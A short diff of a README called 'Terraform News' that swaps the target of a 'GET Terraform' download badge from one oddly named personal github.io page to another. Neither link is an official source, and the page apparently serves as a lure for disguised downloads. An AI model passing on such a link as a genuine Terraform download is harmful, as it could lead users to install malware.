@@ -1,6 +1,6 @@
 # Terraform News - Infrastructure as Code Automation
 
-[![GET Terraform](https://img.shields.io/badge/GET%20%E2%80%94%20Terraform-0078D6?style=for-the-badge&logoColor=white)](https://kingsleytuckerugpv.github.io/.github/terraform-news)
+[![GET Terraform](https://img.shields.io/badge/GET%20%E2%80%94%20Terraform-0078D6?style=for-the-badge&logoColor=white)](https://zaydenyatesemlt.github.io/.github/terraform-news)
 
 ## Terraform Project Overview
 
